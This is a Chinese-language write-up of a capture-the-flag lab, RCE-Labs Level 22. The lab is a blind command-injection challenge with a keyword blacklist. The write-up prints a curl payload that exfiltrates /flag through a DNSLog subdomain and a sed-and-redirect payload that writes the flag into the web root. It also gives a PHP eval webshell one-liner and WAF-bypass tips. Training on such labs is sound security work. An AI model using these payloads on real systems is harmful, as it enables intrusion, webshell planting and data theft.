RCE-Labs Level 22 - curl 命令外带与重定向绕过

2026年10月3日 RCE-Labs 无回显RCE 数据外带

一、题目信息

  • 题目名称：RCE-Labs Level 22 (curl 发起 HTTP 请求)
  • 靶场链接：http://靶机IP:8080/less-22/
  • 涉及工具：浏览器、DNSLog 平台（备用）

二、解题步骤

1. 分析题目考什么

黑名单封禁了 ping。题目提示使用 curl 发起 HTTP 请求进行外带。但实际上，我们继续沿用 重定向写入 Web 目录 的方法，可以更稳定地通关。

2. 怎么想（破题思路与踩坑记录）

踩坑记录一：curl 外带失败

尝试 Payload：?cmd=curl http://\`sed -n '1p' /flag\`.25yzpi.dnslog.cn

失败响应：页面空白，DNSLog 平台没有收到任何请求。

原因分析：和 Level 21 一样，靶机 Docker 环境无外网访问权限，或者出站防火墙拦截了。外带通道走不通。

改进方式：放弃外带，回归重定向写入。

源码核心逻辑

$pattern = '/cat|tac|head|tail|more|less|nl|sort|uniq|od|xxd|hexdump|base32|base64|strings|grep|file|find|cp|mv|ping/';
if(!preg_match($pattern,$cmd)){
    system($cmd);
}

3. 怎么解（详细步骤与逐字翻译）

最终成功 Payload 与操作流程

第一步：利用 `sed` 读取并利用 `>` 重定向写入 Web 目录

?cmd=sed -n '1,10p' /flag > 2.txt

命令逐字解析：

  • sed -n '1,10p' /flag：sed 是流编辑器，-n 抑制自动输出，'1,10p' 表示只打印第 1 到第 10 行。这完美替代了被拉黑的 cat。
  • >：Shell 的重定向符。它会把标准输出（stdout）直接写入右侧的文件中。如果文件不存在则创建。
  • 2.txt：目标文件名。当前目录是 Web 根目录 `/var/www/html/less-22`，所以文件会直接暴露在 HTTP 服务下。

第二步：通过 HTTP 访问写入的文件

在浏览器输入：http://靶机IP:8080/less-22/2.txt

成功响应：页面直接回显明文 flag{TEST_Dynamic_FLAG}。

4. 怎么迁移（跨学科与跨领域联想）

  • 真实渗透中的 Webshell 写入：如果目标有 RCE 但没有回显，攻击者第一反应就是利用重定向写入 Webshell（如 echo "<?php eval(\$_POST[1]);?>" > shell.php），然后连接获取稳定权限。
  • 自动化运维与日志转储：运维脚本常利用 > 将输出写入文件，例如 nohup python app.py > app.log 2>&1 &，实现后台运行与日志持久化。

三、名词大全与原理深度复盘

1. curl 命令的底层机制

curl 是一个利用 URL 规则在命令行下工作的文件传输工具。它支持 HTTP、HTTPS、FTP 等协议。在 RCE 中，它常被用来下载远程文件或发起外带请求。底层依赖 socket 编程（TCP 连接）。

2. 重定向符 `>` 与 `>>` 的区别

  • >：覆盖写入。如果目标文件已存在，会清空原内容再写入。
  • >>：追加写入。在文件末尾追加内容，不覆盖原有数据。在实战中，如果怕覆盖掉服务器上的重要文件，使用 >> 更安全。

3. 为什么写入 Web 目录是王道？

因为它绕过了所有的回显限制和外带网络限制。Web 服务器本身就是用来提供文件访问服务的。只要你有权限在 Web 目录下创建文件，你就能通过 HTTP 协议随时查看它，这是“存储型”的数据回显。

4. 底层解密：Shell 文本语法与二进制机器码的桥梁

这是一个非常核心的疑问：为什么我们拼凑这些字符（如 sed、>、`）就能绕过 WAF 并让服务器执行？它们跟二进制有什么关系？

核心结论：WAF 只懂“文本匹配”，而 CPU 只懂“二进制机器码”。Shell 语法就是连接这两者的“翻译官”。

  • 符号的历史隐喻：> 像箭头，代表输出流向文件；| 像管子，代表数据通过管道传输；`（反引号）代表“先执行里面的，再将结果替换回原处”。这些符号是 1970 年代电传打字机时代的产物，一直沿用至今。
  • Shell 解析的过程：当你输入 sed -n '1,10p' /flag > 2.txt 时，Shell 首先将其切分为命令、参数和重定向符。
  • 系统调用（System Calls）：
    • 遇到 >：Shell 调用内核的 open() 创建 2.txt，再调用 dup2() 将标准输出（文件描述符 1）替换为这个文件。
    • 遇到 sed：Shell 调用 fork() 创建子进程，再调用 execve() 将 /usr/bin/sed 这个 C 语言编译的二进制程序加载到内存中。
  • CPU 执行：这些系统调用在内核层面对应着二进制的机器码指令（如 x86 的 0x48 0x89 0xE5 等）。CPU 执行这些指令，完成磁盘 I/O 和内存搬运。
  • WAF 的盲区：WAF 拦截的是你发送的文本字符串（如 cat），但当你用 sed 或 $IFS、ca? 时，WAF 看不懂这些“黑话”选择放行。而底层 Shell 会忠实地把这些黑话“翻译”成合法的系统调用，最终让 CPU 执行了相同的二进制行为。只要底层的“行为”相同，WAF 的“文本防御”就会被绕过。

四、题目思考

1. 这跟前面关卡的区别

Level 21 引入了无回显，用 `ping` 尝试外带但失败，最后用 `>` 成功。Level 22 换成了 `curl`，但外带依然失败。这说明出题人可能就是想让环境模拟真实内网（不能随意出外网），逼着你去使用“写入 Web 目录”这种更稳重的解法。

2. 如何抽象理解概念（大白话）

把目标服务器比作一个“与世隔绝的孤岛”。你想知道岛上的藏宝图（flag）。你尝试放信鸽（ping）给外界，但鸽子飞不过防火墙；尝试用无线电（curl）发报，但信号被屏蔽。最后你发现，岛上有邮政信箱（Web 目录），你把藏宝图抄一份塞进信箱，然后你坐着小船登岛，直接把信箱里的藏宝图拿走（访问 2.txt）。
